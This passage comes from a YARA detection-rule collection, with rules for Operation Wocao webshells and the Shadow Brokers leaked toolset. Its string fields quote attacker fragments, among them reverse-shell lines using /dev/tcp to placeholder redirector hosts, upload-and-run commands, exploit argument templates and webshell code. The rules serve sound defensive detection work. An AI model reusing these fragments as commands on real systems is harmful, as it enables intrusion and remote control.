		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_wocao.yar#L297-L316"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "e37f8768c7920b8c3d9fdd6bb3a4e748c47a6c06a8aaed01655355ef3d8c3457"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ = "Logger PingConnect"
		$ = "Logger GetAdmins"
		$ = "Logger InstallPro"
		$ = "Logger Exec"
		$ = "retstr = adminsName & \" Members\" & vbCrLf & _"
		$ = "Logger VolumeName & \" (\" & objDrive.DriveLetter & \":)\" _"
		$ = "txtRes = txtRes & machine & \" can"
		$ = "retstr = \"PID   SID Image Name\" & vbCrLf & \"===="

	condition:
		4 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Webshell_Index_Jsp
{
	meta:
		description = "Strings from the index.jsp socket tunnel"
		author = "Fox-IT SRT"
		id = "9c226ccd-6c69-523c-bca4-371e55274667"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_wocao.yar#L337-L353"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "870dad9fb5456f8edbd9f3c2d0b8764cf1143399626ce4df53c93919bcb1a0cb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "X-CMD"
		$x2 = "X-STATUS"
		$x3 = "X-TARGET"
		$x4 = "X-ERROR"
		$a = "out.print(\"All seems fine.\");"

	condition:
		all of ( $x* ) and $a
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Webshell_Ver_Jsp
{
	meta:
		description = "Strings from the ver.jsp webshell"
		author = "Fox-IT SRT"
		id = "b2828b84-8934-5111-9345-683a07025070"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_wocao.yar#L355-L372"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "ada6de4b07a76e79bb17793cda2b51f96554a35992a73f59c360487638ae3be3"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = "String strLogo = request.getParameter(\"id\")"
		$b = "!strLogo.equals(\"256\")"
		$c = "boolean chkos = msg.startsWith"
		$d = "while((c = er.read()) != -1)"
		$e = "out.print((char)c);}in.close()"

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Webshell_Webinfo
{
	meta:
		description = "Generic strings from webinfo.war webshells"
		author = "Fox-IT SRT"
		id = "b8477f62-f3f6-5526-b0e3-9b794fefaa1f"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_wocao.yar#L374-L394"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "711737a56067f24f422cc7d5aeba4389741fe18a0e66f2715fce626c3b6aef19"
		score = 75
		quality = 85
		tags = ""

	strings:
		$var1 = "String strLogo = request.getParameter"
		$var2 = "String content = request.getParameter(\"content\");"
		$var3 = "String basePath=request.getScheme()"
		$var4 = "!strLogo.equals("
		$var5 = "if(path!=null && !path.equals(\"\") && content!=null"
		$var6 = "File newfile=new File(path);"
		$str1 = "Save Success!"
		$str2 = "Save Failed!"

	condition:
		2 of ( $var* ) or ( all of ( $str* ) and 1 of ( $var* ) )
}

rule SIGNATURE_BASE_SUSP_WEBSHELL_Cmd_Indicator_Apr25
{
	meta:
		description = "Detects a pattern which is often related to web shell activity"
		author = "Florian Roth"
		id = "735359b2-9f94-5618-8ec5-7ab8f5e5e16d"
		date = "2025-04-25"
		modified = "2025-05-07"
		reference = "https://regex101.com/r/N6oZ2h/2"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/expl_sap_netweaver_apr25.yar#L29-L41"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "b992786a58389749db40fc90363f00c5df374d514374afc2d6fdff4429cb1ec0"
		score = 60
		quality = 60
		tags = ""

	strings:
		$xr01 = /\.(asp|aspx|jsp|php)\?cmd=[a-z0-9%+\-\/\.]{3,20} HTTP\/1\.[01]["']? 200/

	condition:
		1 of them
}

rule SIGNATURE_BASE_FVEY_Shadowbroker_Violetspirit
{
	meta:
		description = "Auto-generated rule - file violetspirit.README"
		author = "Florian Roth (Nextron Systems)"
		id = "4efea734-8cbc-53f7-bf92-5b3253721a81"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fvey_shadowbroker_dec16.yar#L73-L86"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "01a45feb5c9f9cfe8834306993c53b1e53d79b89b07106ffec0c81cdebb8b71c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "a55fec73595f885e43b27963afb17aee8f8eefe811ca027ef0d7721d073e67ea"

	strings:
		$x1 = "-i tgt_ipaddr -h tgt_hostname" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_FVEY_Shadowbroker_Gr_Gr
{
	meta:
		description = "Auto-generated rule - file gr.notes"
		author = "Florian Roth (Nextron Systems)"
		id = "c233159d-8d78-575b-b32b-21f704debfe2"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fvey_shadowbroker_dec16.yar#L88-L101"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "facce45a335d7ca799d68fc26ee2bf5682cec0914502482189cd6aa496cba489"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "b2b60dce7a4cfdddbd3d3f1825f1885728956bae009de3a307342fbdeeafcb79"

	strings:
		$s4 = "delete starting from: (root) LIST (root)" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_FVEY_Shadowbroker_User_Tool_Yellowspirit
{
	meta:
		description = "Auto-generated rule - file user.tool.yellowspirit.COMMON"
		author = "Florian Roth (Nextron Systems)"
		id = "b1ca04e5-bac7-5247-b2d4-82c3515c92fc"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fvey_shadowbroker_dec16.yar#L103-L117"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "698b23cc4cc6f319ddef7a93cf7ddc83ffae1d2c2b0a9545011b51e381f8cd0c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "a7c4b718fa92934a9182567288146ffa3312d9f3edc3872478c90e0e2814078c"

	strings:
		$s1 = "-l 19.16.1.1 -i 10.0.3.1 -n 2222 -r nscd -x 9999" fullword ascii
		$s2 = "-s PITCH_IP -x PITCH_IP -y RHP-24 TARGET_IP" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_FVEY_Shadowbroker_Eleganteagle_Opscript_1_0_0
{
	meta:
		description = "Auto-generated rule - file eleganteagle_opscript.1.0.0.6"
		author = "Florian Roth (Nextron Systems)"
		id = "22855519-160c-57cf-b610-a611ca6813ed"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fvey_shadowbroker_dec16.yar#L119-L132"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "3df5ba1a497ffe5306ed7966f25f69c30a5191e935c5638869a62b3cb2324f70"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "57e223318de0a802874642652b3dc766128f25d7e8f320c6f04c6f2659bb4f7f"

	strings:
		$x3 = "uploadnrun -e \"D=-ucIP_ADDRESS_OF_REDIR" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_FVEY_Shadowbroker_Opscript
{
	meta:
		description = "Auto-generated rule - file opscript.se"
		author = "Florian Roth (Nextron Systems)"
		id = "d00752a3-d5c2-53a7-9a83-ad31cfb534af"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fvey_shadowbroker_dec16.yar#L134-L147"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "23dd6d537a8639bd84ede141cca577dc91328bd293f96f865c7dedd9ef693ee3"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "275c91531a9ac5a240336714093b6aa146b8d7463cb2780cfeeceaea4c789682"

	strings:
		$s1 = "ls -l /tmp) | bdes -k 0x4790cae5ec154ccc|" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_FVEY_Shadowbroker_User_Tool_Shentysdelight
{
	meta:
		description = "Auto-generated rule - file user.tool.shentysdelight.COMMON"
		author = "Florian Roth (Nextron Systems)"
		id = "b1ca04e5-bac7-5247-b2d4-82c3515c92fc"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fvey_shadowbroker_dec16.yar#L149-L162"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "1acfb6aea7e208b7fd52325258219c162482deb4fa7ee87ddc4de0774e3e74f4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "a564efeaae9c13fe09a27f2d62208a1dec0a19b4a156f5cfa96a0259366b8166"

	strings:
		$s1 = "echo -ne \"/var/run/COLFILE\\0\"" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_FVEY_Shadowbroker_User_Tool_Epichero
{
	meta:
		description = "Auto-generated rule - file user.tool.epichero.COMMON"
		author = "Florian Roth (Nextron Systems)"
		id = "b1ca04e5-bac7-5247-b2d4-82c3515c92fc"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fvey_shadowbroker_dec16.yar#L164-L178"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "36dc38f2dd630f22b87e8d9130de7d40ee3cdba45597b2b667a1a9536d990aad"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "679d194c32cbaead7281df9afd17bca536ee9d28df917b422083ae8ed5b5c484"

	strings:
		$x2 = "-irtun TARGET_IP ISH_CALLBACK_PORT"
		$x3 = "-O REVERSE_SHELL_CALLBACK_PORT -w HIDDEN_DIR" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_FVEY_Shadowbroker_User_Tool
{
	meta:
		description = "Auto-generated rule - file user.tool.elatedmonkey"
		author = "Florian Roth (Nextron Systems)"
		id = "b1ca04e5-bac7-5247-b2d4-82c3515c92fc"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fvey_shadowbroker_dec16.yar#L180-L193"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "8135c07b8c217e81f7618d58c9c3da6585cdb9b8f7afab85bb6556c5b846ba64"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "98ae935dd9515529a34478cb82644828d94a2d273816d50485665535454e37cd"

	strings:
		$x5 = "ELATEDMONKEY will only work of apache executes scripts" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_FVEY_Shadowbroker_User_Tool_Dubmoat
{
	meta:
		description = "Auto-generated rule - file user.tool.dubmoat.COMMON"
		author = "Florian Roth (Nextron Systems)"
		id = "d6c0a00b-dda9-587f-a867-f3b632edd494"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fvey_shadowbroker_dec16.yar#L195-L209"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "368c0a6a1db0003e3a2e4ec5e42a5b5563ea1c2cb89db1751226891e1f7181d8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "bcd4ee336050488f5ffeb850d8eaa11eec34d8ba099b370d94d2c83f08a4d881"

	strings:
		$s1 = "### Verify version on target:" fullword ascii
		$s2 = "/current/bin/ExtractData ./utmp > dub.TARGETNAME" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_FVEY_Shadowbroker_Strifeworld
{
	meta:
		description = "Auto-generated rule - file strifeworld.1"
		author = "Florian Roth (Nextron Systems)"
		id = "a15c2034-8394-5e62-a5f0-d1506c19e585"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fvey_shadowbroker_dec16.yar#L211-L225"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "2b113b042fd62109ee3ee39515fbd22f3898abf320d75f1288ea88e40b3444c0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "222b00235bf143645ad0d55b2b6839febc5b570e3def00b77699915a7c9cb670"

	strings:
		$s4 = "-p -n.\" strifeworld" fullword ascii
		$s5 = "Running STRIFEWORLD not protected" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_FVEY_Shadowbroker_User_Tool_Pork
{
	meta:
		description = "Auto-generated rule - file user.tool.pork.COMMON"
		author = "Florian Roth (Nextron Systems)"
		id = "ee5f88b1-6e58-5288-8b80-0d3d188e1ac6"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fvey_shadowbroker_dec16.yar#L227-L242"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "c3f9f90f83f3672b101e52f36012c485c29840cf0b2ced00087fb27725fd1545"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "9c400aab74e75be8770387d35ca219285e2cedc0c7895225bbe567ce9c9dc078"

	strings:
		$x2 = "packrat -z RAT_REMOTE_NAME" fullword ascii
		$s3 = "./client -t TIME_ADJ SPECIAL_SOURCE_PORT 127.0.0.1 TARG_PORT" ascii
		$s4 = "mkdir TEMP_DIR; cd TEMP_DIR; cat < /dev/tcp/REDIR_IP/RED" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_FVEY_Shadowbroker_User_Tool_Ebbisland
{
	meta:
		description = "Auto-generated rule - file user.tool.ebbisland.COMMON"
		author = "Florian Roth (Nextron Systems)"
		id = "fd312ba2-d590-5007-875c-008553c2b1b9"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fvey_shadowbroker_dec16.yar#L244-L258"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0a45ea3cd6aeea9299ef67ae82c9f4bf929a961695e7cce344aa1737fa4c07b0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "390e776ae15fadad2e3825a5e2e06c4f8de6d71813bef42052c7fd8494146222"

	strings:
		$x1 = "-t 127.0.0.1 -p SERVICE_TCP_PORT -r TARGET_RPC_SERVICE -X"
		$x2 = "-N -A SPECIFIC_SHELLCODE_ADDRESS" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_FVEY_Shadowbroker_User_Tool_Stoicsurgeon
{
	meta:
		description = "Auto-generated rule - file user.tool.stoicsurgeon.COMMON"
		author = "Florian Roth (Nextron Systems)"
		id = "2ff22b17-4922-54d7-bbd8-a5ff40b6ebe5"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fvey_shadowbroker_dec16.yar#L260-L273"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "322599ba7d5536b7f0856980a6caab86de66c02da75bf55e97bf129d08c43031"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "967facb19c9b563eb90d3df6aa89fd7dcfa889b0ba601d3423d9b71b44191f50"

	strings:
		$x1 = "echo -n TARGET_HOSTNAME  | sed '/\\n/!G;s/\\(.\\)\\(.*\\n\\)/&\\2\\1/;//D;s/.//'" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_FVEY_Shadowbroker_User_Tool_Elgingamble
{
	meta:
		description = "Auto-generated rule - file user.tool.elgingamble.COMMON"
		author = "Florian Roth (Nextron Systems)"
		id = "344e5d5e-9fd6-5a32-ba98-945f5a35a116"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fvey_shadowbroker_dec16.yar#L275-L288"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "2f4dd668c59244e92ebfe0e2fc2859b2376cf1dd6fc6522e8f452787aa96365f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "4130284727ddef4610d63bfa8330cdafcb6524d3d2e7e8e0cb34fde8864c8118"

	strings:
		$x2 = "### Local exploit for" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_FVEY_Shadowbroker_README_Cup
{
	meta:
		description = "Auto-generated rule - file README.cup.NOPEN"
		author = "Florian Roth (Nextron Systems)"
		id = "876f3d99-cc6d-568a-a202-1b4938436303"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fvey_shadowbroker_dec16.yar#L290-L304"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "bd05a23ce29be88c1a459358c984e1317cf56d21e5b378624af644fb2b41931d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "98aaad31663b89120eb781b25d6f061037aecaeb20cf5e32c36c68f34807e271"

	strings:
		$s3 = "-F file(s)   Full path to target's \"fuser\" program." fullword ascii
		$s4 = "done after the RAT is killed." fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_FVEY_Shadowbroker_Nopen_Oneshot
{
	meta:
		description = "Auto-generated rule - file oneshot.example"
		author = "Florian Roth (Nextron Systems)"
		id = "6a6b5426-f559-5668-a2ed-982801933302"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fvey_shadowbroker_dec16.yar#L306-L319"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "19aa32aafaaccc6697bbaff642d996554eccf2261d23071cfb8599ea0eea628b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "a85b260d6a53ceec63ad5f09e1308b158da31062047dc0e4d562d2683a82bf9a"

	strings:
		$s1 = "/sbin/sh -c (mkdir /tmp/.X11R6; cd /tmp/.X11R6 && telnet" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_FVEY_Shadowbroker_User_Tool_Earlyshovel
{
	meta:
		description = "Auto-generated rule - file user.tool.earlyshovel.COMMON"
		author = "Florian Roth (Nextron Systems)"
		id = "d2640f9f-8934-5095-9c30-f24941685c9e"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fvey_shadowbroker_dec16.yar#L321-L334"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "396810b439ac53f393ad37a8acbd7236f8325730c75c1a6339e4c6343ecade7a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "504e7a376c21ffbfb375353c5451dc69a35a10d7e2a5d0358f9ce2df34edf256"

	strings:
		$x1 = "--tip 127.0.0.1 --tport 2525 --cip REDIRECTOR_IP --cport RANDOM_PORT" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_FVEY_Shadowbroker_User_Tool_Envisioncollision
{
	meta:
		description = "Auto-generated rule - file user.tool.envisioncollision.COMMON"
		author = "Florian Roth (Nextron Systems)"
		id = "a738e270-a3ea-5d38-8933-797d1bd9036a"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fvey_shadowbroker_dec16.yar#L336-L352"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "36b2a20ef3a6540a686d7f52c8c885842fd84ba7c7daa74c21e241e25826030e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "2f04f078a8f0fdfc864d3d2e37d123f55ecc1d5e401a87eccd0c3846770f9e02"

	strings:
		$x1 = "-i<IP> -p<port> -U<user> -P<password> -D<directory> -c<commands>" fullword ascii
		$x2 = "sh</dev/tcp/REDIR_IP/SHELL_PORT>&0" fullword ascii
		$x3 = "-n ENVISIONCOLLISION" ascii
		$x4 = "-UADMIN -PPASSWORD -i127.0.0.1 -Dipboard" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_FVEY_Shadowbroker_Gen_Readme1
{
	meta:
		description = "Auto-generated rule"
		author = "Florian Roth (Nextron Systems)"
		id = "1f5e3ab1-e0d1-589e-8c18-60c4ad07ee6e"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fvey_shadowbroker_dec16.yar#L356-L372"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "171d3df191e5c9ae4a4afc3a878cc25548238046b8c4c52dbb9ca4431aae45b0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash1 = "4b236b066ac7b8386a13270dcb7fdff2dda81365d03f53867eb72e29d5e496de"
		hash2 = "64c24bbf42f15dcac04371aef756feabb7330f436c20f33cb25fbc8d0ff014c7"
		hash3 = "a237a2bd6aec429f9941d6de632aeb9729880aa3d5f6f87cf33a76d6caa30619"

	strings:
		$x1 = "ls -latr /tp/med/archive/collect/siemens_msc_isb01/.tmp_ncr/*.MSC | head -10" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_FVEY_Shadowbroker_Gen_Readme2
{
	meta:
		description = "Auto-generated rule - from files user.tool.orleansstride.COMMON, user.tool.curserazor.COMMON"
		author = "Florian Roth (Nextron Systems)"
		id = "5959d881-2989-582c-abe2-48c76ce0e995"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fvey_shadowbroker_dec16.yar#L374-L389"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "eb68c415d64d1db3d4bb0f4ad994bd050cb2287e4dc7b3ac57549f818a7914d8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash1 = "18dfd74c3e0bfb1c21127cf3382ba1d9812efdf3e992bd666d513aaf3519f728"
		hash2 = "f4b728c93dba20a163b59b4790f29aed1078706d2c8b07dc7f4e07a6f3ecbe93"

	strings:
		$x1 = "#####  Upload the encrypted phone list as awk, modify each parser command to have the" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_FVEY_Shadowbroker_Gen_Readme3
{
	meta:
		description = "Auto-generated rule"
		author = "Florian Roth (Nextron Systems)"
		id = "41cfbf66-fb7d-5815-939f-06b23dfae746"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fvey_shadowbroker_dec16.yar#L391-L411"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "968ec80f26750ac734ad9e296b5afb35867f6c53de1e88f7c8af78daeac24b61"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash1 = "18dfd74c3e0bfb1c21127cf3382ba1d9812efdf3e992bd666d513aaf3519f728"
